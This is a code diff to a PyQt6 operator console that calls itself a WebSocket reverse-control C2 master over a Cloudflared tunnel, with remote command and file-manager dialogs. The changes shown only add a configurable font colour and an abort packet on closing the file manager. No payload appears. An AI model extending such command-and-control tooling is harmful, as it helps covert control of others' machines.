@@ -10,9 +10,9 @@ from datetime import datetime
 from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                              QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
                              QMenu, QAbstractItemView, QTreeWidget, QTreeWidgetItem,
-                             QInputDialog, QFileDialog, QProgressBar)
+                             QInputDialog, QFileDialog, QProgressBar, QColorDialog)
 from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot, QTimer
-from PyQt6.QtGui import QColor, QPalette
+from PyQt6.QtGui import QColor
 
 WS_OP_CONTINUE = 0x00
 WS_OP_TEXT = 0x01
@@ -24,15 +24,13 @@ WS_OP_PONG = 0x0A
 FILE_CHUNK = 32768
 UPLOAD_WINDOW = 8
 
-# ============ 夜间模式 CMD 配色 ============
-DARK_BG = "#000000"          # 纯黑背景
-DARK_FG = "#00ff00"          # 亮绿文字
-DARK_SEL_BG = "#003300"      # 选中项背景（深绿）
-DARK_BORDER = "#00aa00"      # 边框绿
-DARK_BTN_BG = "#0a0a0a"      # 按钮背景（近黑）
-DARK_BTN_HOVER = "#003300"   # 按钮悬停
-DARK_DISABLED = "#005500"    # 禁用文字
-DARK_PROGRESS_CHUNK = "#00aa00"  # 进度条填充
+DARK_BG = "#000000"
+DARK_SEL_BG = "#003300"
+DARK_BORDER = "#00aa00"
+DARK_BTN_BG = "#0a0a0a"
+DARK_BTN_HOVER = "#003300"
+DARK_DISABLED = "#005500"
+DARK_PROGRESS_CHUNK = "#00aa00"
 
 
 def log_console(msg: str):
@@ -250,22 +248,22 @@ class RemoteCmdDialog(QDialog):
         log_console(f"CMD会话打开: {client_session.display_name}")
 
         if parent and hasattr(parent, 'is_dark_mode'):
-            self.apply_theme(parent.is_dark_mode)
+            self.apply_theme(parent.is_dark_mode, parent.fg_color)
 
-    def apply_theme(self, dark: bool):
+    def apply_theme(self, dark: bool, fg_color: str = "#00ff00"):
         if dark:
             self.setStyleSheet(f"""
                 QDialog {{ background-color: {DARK_BG}; }}
-                QLabel {{ color: {DARK_FG}; }}
+                QLabel {{ color: {fg_color}; }}
                 QTextEdit {{
                     background-color: {DARK_BG};
-                    color: {DARK_FG};
+                    color: {fg_color};
                     border: 1px solid {DARK_BORDER};
                     font-family: Consolas, "Courier New", monospace;
                 }}
                 QLineEdit {{
                     background-color: {DARK_BG};
-                    color: {DARK_FG};
+                    color: {fg_color};
                     border: 1px solid {DARK_BORDER};
                     font-family: Consolas, "Courier New", monospace;
                 }}
@@ -367,44 +365,44 @@ class FileManagerDialog(QDialog):
         log_console(f"文件管理打开: {client_session.display_name}")
         self.client.send_packet(b"FDRV")
         if parent and hasattr(parent, 'is_dark_mode'):
-            self.apply_theme(parent.is_dark_mode)
+            self.apply_theme(parent.is_dark_mode, parent.fg_color)
 
-    def apply_theme(self, dark: bool):
+    def apply_theme(self, dark: bool, fg_color: str = "#00ff00"):
         if dark:
             self.setStyleSheet(f"""
                 QDialog {{ background-color: {DARK_BG}; }}
-                QLabel {{ color: {DARK_FG}; }}
+                QLabel {{ color: {fg_color}; }}
                 QLineEdit {{
                     background-color: {DARK_BG};
-                    color: {DARK_FG};
+                    color: {fg_color};
                     border: 1px solid {DARK_BORDER};
                     font-family: Consolas, "Courier New", monospace;
                 }}
                 QTreeWidget {{
                     background-color: {DARK_BG};
-                    color: {DARK_FG};
+                    color: {fg_color};
                     border: 1px solid {DARK_BORDER};
                     font-family: Consolas, "Courier New", monospace;
                 }}
                 QTreeWidget::item:selected {{
                     background-color: {DARK_SEL_BG};
-                    color: {DARK_FG};
+                    color: {fg_color};
                 }}
                 QTreeWidget QHeaderView::section {{
                     background-color: {DARK_BG};
-                    color: {DARK_FG};
+                    color: {fg_color};
                     border: 1px solid {DARK_BORDER};
                     padding: 3px;
                 }}
                 QTextEdit {{
                     background-color: {DARK_BG};
-                    color: {DARK_FG};
+                    color: {fg_color};
                     border: 1px solid {DARK_BORDER};
                     font-family: Consolas, "Courier New", monospace;
                 }}
                 QPushButton {{
                     background-color: {DARK_BTN_BG};
-                    color: {DARK_FG};
+                    color: {fg_color};
                     border: 1px solid {DARK_BORDER};
                     padding: 4px 10px;
                     font-family: Consolas, "Courier New", monospace;
@@ -413,7 +411,7 @@ class FileManagerDialog(QDialog):
                 QPushButton:disabled {{ color: {DARK_DISABLED}; }}
                 QProgressBar {{
                     background-color: {DARK_BG};
-                    color: {DARK_FG};
+                    color: {fg_color};
                     border: 1px solid {DARK_BORDER};
                     text-align: center;
                     font-family: Consolas, "Courier New", monospace;
@@ -743,6 +741,8 @@ class FileManagerDialog(QDialog):
 
     def closeEvent(self, event):
         self.timer.stop()
+        if self.client.connected:
+            self.client.send_packet(b"FABT")
         self.reset_transfer_state()
         log_console(f"文件管理关闭: {self.client.display_name}")
         super().closeEvent(event)
@@ -779,6 +779,8 @@ class MainWindow(QMainWindow):
         super().__init__()
         self.base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
         self.is_dark_mode = False
+        self.fg_color = "#00ff00"  # 默认亮绿
+
         self.setWindowTitle("WebSocket 反向控制主控端 (Cloudflared Tunnel 模式)")
         self.resize(720, 520)
         self.server_sock = None
@@ -800,6 +802,9 @@ class MainWindow(QMainWindow):
         self.btn_stop = QPushButton("停止监听"); self.btn_stop.clicked.connect(self.stop_server)
         self.btn_stop.setEnabled(False); top_lay.addWidget(self.btn_stop)
         top_lay.addStretch()
+        self.btn_color = QPushButton("🎨 字体颜色")
+        self.btn_color.clicked.connect(self.choose_color)
+        top_lay.addWidget(self.btn_color)
         self.btn_theme = QPushButton("🌙 夜间模式"); self.btn_theme.clicked.connect(self.toggle_theme)
         top_lay.addWidget(self.btn_theme)
         lay.addLayout(top_lay)
@@ -822,23 +827,31 @@ class MainWindow(QMainWindow):
         self.apply_theme(False)
         log_console("C2 启动，等待开始监听")
 
+    def choose_color(self):
+        color = QColorDialog.getColor(QColor(self.fg_color), self, "选择字体颜色")
+        if color.isValid():
+            self.fg_color = color.name()
+            log_console(f"字体颜色改为: {self.fg_color}")
+            self.apply_theme(self.is_dark_mode)
+
     def apply_theme(self, dark: bool):
         self.is_dark_mode = dark
+        fg = self.fg_color
         if dark:
             self.setStyleSheet(f"""
                 QMainWindow {{ background-color: {DARK_BG}; }}
-                QWidget {{ background-color: {DARK_BG}; color: {DARK_FG}; }}
-                QLabel {{ color: {DARK_FG}; }}
+                QWidget {{ background-color: {DARK_BG}; color: {fg}; }}
+                QLabel {{ color: {fg}; }}
                 QLineEdit {{
                     background-color: {DARK_BG};
-                    color: {DARK_FG};
+                    color: {fg};
                     border: 1px solid {DARK_BORDER};
                     padding: 4px;
                     font-family: Consolas, "Courier New", monospace;
                 }}
                 QPushButton {{
                     background-color: {DARK_BTN_BG};
-                    color: {DARK_FG};
+                    color: {fg};
                     border: 1px solid {DARK_BORDER};
                     padding: 5px 15px;
                     font-family: Consolas, "Courier New", monospace;
@@ -847,81 +860,81 @@ class MainWindow(QMainWindow):
                 QPushButton:disabled {{ color: {DARK_DISABLED}; }}
                 QListView {{
                     background-color: {DARK_BG};
-                    color: {DARK_FG};
+                    color: {fg};
                     border: 1px solid {DARK_BORDER};
                     font-family: Consolas, "Courier New", monospace;
                 }}
                 QListView::item:selected {{
                     background-color: {DARK_SEL_BG};
-                    color: {DARK_FG};
+                    color: {fg};
                 }}
                 QTextEdit {{
                     background-color: {DARK_BG};
-                    color: {DARK_FG};
+                    color: {fg};
                     border: 1px solid {DARK_BORDER};
                     font-family: Consolas, "Courier New", monospace;
                 }}
                 QMenu {{
                     background-color: {DARK_BG};
-                    color: {DARK_FG};
+                    color: {fg};
                     border: 1px solid {DARK_BORDER};
                     font-family: Consolas, "Courier New", monospace;
                 }}
                 QMenu::item:selected {{
                     background-color: {DARK_SEL_BG};
-                    color: {DARK_FG};
+                    color: {fg};
                 }}
                 QTreeWidget {{
                     background-color: {DARK_BG};
-                    color: {DARK_FG};
+                    color: {fg};
                     border: 1px solid {DARK_BORDER};
                     font-family: Consolas, "Courier New", monospace;
                 }}
                 QTreeWidget::item:selected {{
                     background-color: {DARK_SEL_BG};
-                    color: {DARK_FG};
+                    color: {fg};
                 }}
                 QTreeWidget QHeaderView::section {{
                     background-color: {DARK_BG};
-                    color: {DARK_FG};
+                    color: {fg};
                     border: 1px solid {DARK_BORDER};
                     padding: 3px;
                 }}
                 QProgressBar {{
                     background-color: {DARK_BG};
-                    color: {DARK_FG};
+                    color: {fg};
                     border: 1px solid {DARK_BORDER};
                     text-align: center;
                     font-family: Consolas, "Courier New", monospace;
                 }}
                 QProgressBar::chunk {{ background-color: {DARK_PROGRESS_CHUNK}; }}
                 QInputDialog {{ background-color: {DARK_BG}; }}
-                QInputDialog QLabel {{ color: {DARK_FG}; }}
+                QInputDialog QLabel {{ color: {fg}; }}
                 QInputDialog QLineEdit {{
                     background-color: {DARK_BG};
-                    color: {DARK_FG};
+                    color: {fg};
                     border: 1px solid {DARK_BORDER};
                 }}
                 QInputDialog QPushButton {{
                     background-color: {DARK_BTN_BG};
-                    color: {DARK_FG};
+                    color: {fg};
                     border: 1px solid {DARK_BORDER};
                     padding: 4px 12px;
                 }}
                 QFileDialog {{ background-color: {DARK_BG}; }}
-                QFileDialog QLabel {{ color: {DARK_FG}; }}
+                QFileDialog QLabel {{ color: {fg}; }}
                 QFileDialog QLineEdit {{
                     background-color: {DARK_BG};
-                    color: {DARK_FG};
+                    color: {fg};
                     border: 1px solid {DARK_BORDER};
                 }}
                 QFileDialog QListView, QFileDialog QTreeView {{
                     background-color: {DARK_BG};
-                    color: {DARK_FG};
+                    color: {fg};
                 }}
                 QFileDialog QPushButton {{
                     background-color: {DARK_BTN_BG};
-                    color: {DARK_FG};
+                    color: {fg};
                     border: 1px solid {DARK_BORDER};
                     padding: 4px 12px;
                 }}
@@ -931,9 +944,9 @@ class MainWindow(QMainWindow):
             self.setStyleSheet("")
             self.btn_theme.setText("🌙 夜间模式")
         for dlg in self.open_cmd_dialogs.values():
-            dlg.apply_theme(dark)
+            dlg.apply_theme(dark, fg)
         for dlg in self.open_file_dialogs.values():
-            dlg.apply_theme(dark)
+            dlg.apply_theme(dark, fg)
 
     def toggle_theme(self):
         self.apply_theme(not self.is_dark_mode)
@@ -1109,7 +1122,7 @@ class MainWindow(QMainWindow):
                 else:
                     del self.open_cmd_dialogs[sess]
             dlg = RemoteCmdDialog(sess, parent=self)
-            dlg.apply_theme(self.is_dark_mode)
+            dlg.apply_theme(self.is_dark_mode, self.fg_color)
             self.open_cmd_dialogs[sess] = dlg
             dlg.show()
         elif ret == act_file:
@@ -1120,7 +1133,7 @@ class MainWindow(QMainWindow):
                 else:
                     del self.open_file_dialogs[sess]
             dlg = FileManagerDialog(sess, parent=self)
-            dlg.apply_theme(self.is_dark_mode)
+            dlg.apply_theme(self.is_dark_mode, self.fg_color)
             self.open_file_dialogs[sess] = dlg
             dlg.show()
 
